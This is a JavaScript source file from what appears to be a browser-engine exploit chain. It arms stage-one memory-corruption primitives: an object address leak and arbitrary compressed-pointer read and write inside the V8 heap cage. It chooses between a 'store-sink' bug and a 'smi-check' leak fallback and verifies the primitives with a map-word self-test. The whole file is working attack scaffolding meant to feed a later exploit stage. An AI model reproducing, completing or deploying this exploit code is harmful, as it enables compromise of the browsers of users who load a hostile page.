/* =====================================================================
 * primitive.js -- selects a stage-1 implementation and exposes the single
 * interface exploit.js consumes:
 *
 *   window.PRIM = {
 *     addrof(obj)        -> Number  32-bit COMPRESSED address, tag cleared
 *     read64c(cAddr)     -> BigInt  8 bytes at cageBase() + cAddr
 *     write64c(cAddr, v) -> void
 *   }
 *
 * Two interchangeable implementations:
 *
 *   "storesink"  PRIMARY.  window.PRIM_STORESINK.arm() resolves to either
 *                {addrof, read64c, write64c} -- a complete single-bug chain,
 *                which is what we want -- or just {read64c, write64c}, in
 *                which case the leak half is taken from smicheck.
 *   "smicheck"   FALLBACK leak half only (sce.js).  Verified, natural and
 *                deterministic, but it is provably leak-only: every
 *                kUnsignedLessThan/kOutOfBounds site in the graph builder has
 *                the index as input(0) and each keyed access emits its own
 *                check against its own length, so there is no unchecked index
 *                path and no OOB to be had from it.
 *
 * The smicheck victim is NOT run unless it is actually needed.  Two victims
 * on the hot path means two tier-up windows, two feedback vectors that must
 * both stay unmatured, and two functions racing the same concurrent
 * compilation queue -- all avoidable if the primary comes up complete.
 * ===================================================================== */
(function () {
  "use strict";

  function log(m) { try { if (window.XLOG) window.XLOG(m); } catch (e) {} }

  window.PRIM = null;
  window.PRIM_READY = false;
  window.PRIM_IMPL = null;

  function plausibleCompressed(a) {
    return typeof a === "number" && a > 0x1000 && a < 0xffffffff && (a & 1) === 0;
  }

  // Self-test that does not depend on any particular object layout: two
  // objects created from the same literal share a map, so the first word at
  // each of their addresses must be equal and non-zero.
  function selfTestRW(addrof, read64c) {
    var o1 = { aa: 1 }, o2 = { aa: 2 };
    var a1 = addrof(o1), a2 = addrof(o2);
    if (!plausibleCompressed(a1) || !plausibleCompressed(a2))
      throw new Error("addrof returned implausible values 0x" +
                      a1.toString(16) + " / 0x" + a2.toString(16));
    var m1 = Number(read64c(a1) & 0xffffffffn) >>> 0;
    var m2 = Number(read64c(a2) & 0xffffffffn) >>> 0;
    if (m1 === 0 || m1 !== m2)
      throw new Error("read64c self-test failed: map words 0x" +
                      m1.toString(16) + " vs 0x" + m2.toString(16));
    return m1;
  }

  window.ARM_PRIMITIVE = async function () {
    var errors = [];

    // ---------------- primary: store-sink, ideally on its own -------------
    if (window.PRIM_STORESINK && typeof window.PRIM_STORESINK.arm === "function") {
      try {
        log("arming store-sink primitive...");
        var p = await window.PRIM_STORESINK.arm();
        if (p && typeof p.read64c === "function" && typeof p.write64c === "function") {
          if (typeof p.addrof === "function") {
            var map = selfTestRW(p.addrof, p.read64c);
            window.PRIM = { addrof: p.addrof, read64c: p.read64c, write64c: p.write64c };
            window.PRIM_IMPL = "storesink";
            window.PRIM_READY = true;
            log("PRIM ready: store-sink alone (single bug), map word 0x" + map.toString(16));
            return window.PRIM;
          }
          // write half only -- borrow the leak half from smi-check
          log("store-sink gave read/write but no addrof; adding the smi-check leak");
          var addrof = await window.SCE.arm();
          var map2 = selfTestRW(addrof, p.read64c);
          window.PRIM = { addrof: addrof, read64c: p.read64c, write64c: p.write64c };
          window.PRIM_IMPL = "storesink+smicheck";
          window.PRIM_READY = true;
          log("PRIM ready: store-sink write + smi-check leak, map word 0x" + map2.toString(16));
          return window.PRIM;
        }
        errors.push("store-sink arm() returned an incomplete object");
      } catch (e) {
        errors.push("store-sink: " + e);
        log("store-sink primitive failed: " + e);
      }
    } else {
      errors.push("no window.PRIM_STORESINK");
    }

    // ---------------- fallback: smi-check leak + whatever write exists ----
    if (window.WRITE_PRIM && typeof window.WRITE_PRIM.arm === "function") {
      try {
        log("falling back: smi-check leak + WRITE_PRIM");
        var af = await window.SCE.arm();
        var w = await window.WRITE_PRIM.arm(af);
        var map3 = selfTestRW(af, w.read64c);
        window.PRIM = { addrof: af, read64c: w.read64c, write64c: w.write64c };
        window.PRIM_IMPL = "smicheck+writeprim";
        window.PRIM_READY = true;
        log("PRIM ready: fallback path, map word 0x" + map3.toString(16));
        return window.PRIM;
      } catch (e2) {
        errors.push("fallback: " + e2);
      }
    }

    throw new Error("no usable primitive. " + errors.join(" | "));
  };
})();
